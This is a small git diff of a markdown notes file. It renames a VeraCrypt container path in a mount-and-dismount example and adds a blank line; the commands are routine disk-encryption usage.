@@ -7217,12 +7314,13 @@ $ git push -u origin new-pull-request
 ```
 
 
+
 ### veracrypt
 
 * [https://www.veracrypt.fr/en/Downloads.html](https://www.veracrypt.fr/en/Downloads.html)
 
 ```
-$ veracrypt -t --pim=0 --keyfiles='' --protect-hidden=no /home/snovvcrash/AngaraTech.dat /mnt
+$ veracrypt -t --pim=0 --keyfiles='' --protect-hidden=no /home/snovvcrash/SecretVolume.dat /mnt
 $ veracrypt -d
 ```
 
